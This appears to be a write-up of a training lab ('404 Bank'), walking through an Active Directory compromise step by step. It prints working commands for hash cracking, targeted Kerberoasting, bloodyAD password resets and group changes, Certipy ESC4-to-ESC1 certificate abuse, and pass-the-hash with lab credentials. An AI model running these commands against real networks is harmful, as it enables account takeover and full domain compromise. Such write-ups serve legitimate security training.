---
title: "Technical Methodology Demonstration: Simulated AD Compromise (404 Bank)"
date: 2026-11-07
draft: false
tags: ["Active Directory", "Penetration Testing", "Methodology", "RustScan", "AD CS"]
summary: "End-to-end technical methodology walkthrough demonstrating network enumeration, credential hunting, and Active Directory escalation paths."
---


**Lab Name:** 404 Bank  
**Difficulty:** Medium  
**Category:** Internal Penetration Test / Active Directory  

## 1. Objective / Scope
404 Bank commissioned the Red Team to perform an internal penetration test. The objective was to assess the internal Active Directory environment starting from a standard VPN connection with zero prior knowledge or provisioned credentials.

## 2. Initial Enumeration
Initial reconnaissance was conducted using `RustScan` to rapidly identify open ports, piped into `Nmap` for detailed service enumeration and script scanning.

```bash
rustscan -b500 -a 10.1.253.129 -- -sC -sV -Pn
```

**Key Discovered Services:**
*   **80/tcp:** HTTP (Microsoft IIS 10.0)
*   **88/tcp:** Kerberos
*   **389/tcp & 636/tcp:** LDAP / LDAPS (Domain: `404finance.local`)
*   **445/tcp:** SMB
*   **3389/tcp:** RDP
*   **5985/tcp:** WinRM (HTTP)

### Web Enumeration
Directory brute-forcing was performed on the IIS web server using `Feroxbuster`:

```bash
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -u http://10.1.253.129
```
This revealed several images, an `index.html`, `history.html`, and `services.html`. Reviewing the web content identified three potential employee names: Karl Hackermann, Alex Meier, and Robert Graef. 

## 3. Initial Access
The web server hosted an executable named `CorpBankDialer.exe`. Reverse engineering the binary using `strings` revealed a hardcoded debugging artifact:

```text
DEBUG: ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=\n
```

Decoding this Base64 string yielded an MD5 hash (`dd2ef34530de7e5bef22a05e7e5dd178`). The hash was cracked offline using `Hashcat` and the `rockyou.txt` wordlist:

```bash
hashcat -a 0 -m 0 dd2ef34530de7e5bef22a05e7e5dd178 rockyou.txt
# Result: Password123!!
```

Using `username-anarchy`, a custom wordlist was generated from the scraped employee names. A password spraying attack confirmed that these credentials belonged to `karl.hackermann`.

## 4. Internal Escalation & Lateral Movement
With initial AD access, BloodHound data was collected using `NetExec` (nxc):

```bash
nxc ldap 10.1.253.129 -u karl.hackermann -p 'Password123!!' --bloodhound-collection all -dns-server 10.1.253.129
```

**Attack Path Discovery:**
BloodHound analysis revealed that `karl.hackermann` had `GenericWrite` privileges over the `tom.reboot` user. This privilege was abused to perform targeted Kerberoasting:

```bash
./targetedkerberoast.py -d '404finance.local' -u 'karl.hackermann' -p 'Password123!!' -dc-ip 10.1.253.129
```

This successfully extracted the Kerberos ticket for `tom.reboot`. The ticket was cracked offline using Hashcat (Mode 13100), revealing the password `P@ssw0rd123`.

### Abusing ForceChangePassword
BloodHound further indicated that `tom.reboot` held `ForceChangePassword` rights over `robert.graef`. This was exploited using `bloodyAD`:

```bash
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'tom.reboot' -p 'P@ssw0rd123' set password 'robert.graef' 'Pwned123@!'
```

`robert.graef` possessed the ability to modify group memberships. This right was abused to add another user, `jan.tresor`, to the `Remote Desktop Users` group:

```bash
bloodyAD --host DC-404.404finance.local -d 404finance.local -u 'robert.graef' -p 'Pwned123@!' add groupMember 'remote desktop users' 'jan.tresor'
```

## 5. Post-Exploitation & Pivoting
RDP access was established as `jan.tresor`. Post-exploitation enumeration of the desktop revealed a populated Recycle Bin containing credentials for `daniel.hoffmann` (`RemoteAccess!2024`). 

Checking BloodHound confirmed `daniel.hoffmann` was a member of the `Remote Management Users` group, allowing lateral movement via `Evil-WinRM`.

```bash
evil-winrm -i DC-404.404finance.local -u daniel.hoffmann -p 'RemoteAccess!2024'
```

### Discovering the Internal Web Service
Running `netstat -ano` on the compromised host revealed a service listening locally on TCP port 5000 that was completely shielded from the external network.

To access this internal service, the `Ligolo-ng` agent was uploaded to the host via Evil-WinRM, establishing a reverse tunnel. Concurrently, `daniel.hoffmann`'s `GenericWrite` privileges were used to force a password reset on the `webadmin` account.

Browsing to `http://127.0.0.1:5000` through the tunnel as `webadmin` provided access to an "Internal Admin Interface," which hosted a `config_backup.zip` file.

### Credential Harvesting
The downloaded ZIP archive was password-protected. A custom dictionary was generated from the target's website using `CeWL`, and the archive was cracked using `John the Ripper`:

```bash
cewl --depth 10 --with-numbers --write cewl.txt http://404finance.local/history.html
zip2john config_backup.zip > config_backup.zip.hash
john --wordlist=./cewl.txt config_backup.zip.hash
# Result: DontmessWithTexas
```

Extracting the archive revealed a `config.dat` file containing cleartext credentials for the `svc.services` domain account (`S3rv1cePower2024!`). 

## 6. Domain Compromise (AD CS ESC4 to ESC1)
The `svc.services` account was verified via NetExec but found to be disabled. `robert.graef`'s privileges were leveraged to re-enable the account:

```bash
bloodyAD --host DC-404.404finance.local -d 404finance.local -u robert.graef -p 'Pwned123@!' remove uac svc.services -f ACCOUNTDISABLE
```

BloodHound and `Certipy` enumeration confirmed that `svc.services` possessed excessive control over the `Vuln-ESC4` Active Directory Certificate Services (AD CS) template (ESC4 vulnerability).

The template was modified to an ESC1-exploitable state (enabling "Enrollee Supplies Subject" and adding "Client Authentication"):

```bash
certipy-ad template -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' -template Vuln-ESC4 -dc-ip 10.1.253.129 -write-default-configuration
```

With the template vulnerable, a certificate was requested masquerading as the Domain Administrator:

```bash
certipy-ad req -u 'svc.services@404finance.local' -p 'S3rv1cePower2024!' -template Vuln-ESC4 -ca 404finance-DC-404-CA -dc-ip 10.1.253.129 -target dc-404.404finance.local -upn administrator@404finance.local
```

The resulting certificate (`administrator.pfx`) was utilized to authenticate via PKINIT and extract the Domain Administrator's NTLM hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.253.129
# Extracted Hash: a6019e48da8f602a60c30a6f0136d792
```

Pass-the-Hash (PtH) with Evil-WinRM granted a shell as `NT AUTHORITY\SYSTEM` (Administrator), achieving complete domain compromise.

## 7. Summary of Findings
*   Initial access was obtained by reverse-engineering an internal executable to extract an MD5 hash, followed by password spraying.
*   `GenericWrite` privileges enabled targeted Kerberoasting for lateral movement.
*   Chained AD delegated permissions (`ForceChangePassword`, group modifications) facilitated movement to standard user desktops.
*   Insecure credential storage (Recycle Bin) and weak cryptographic archive passwords exposed a high-privileged service account.
*   A severe AD CS misconfiguration (ESC4) allowed template modification to escalate privileges (ESC1), resulting in full Domain Admin compromise.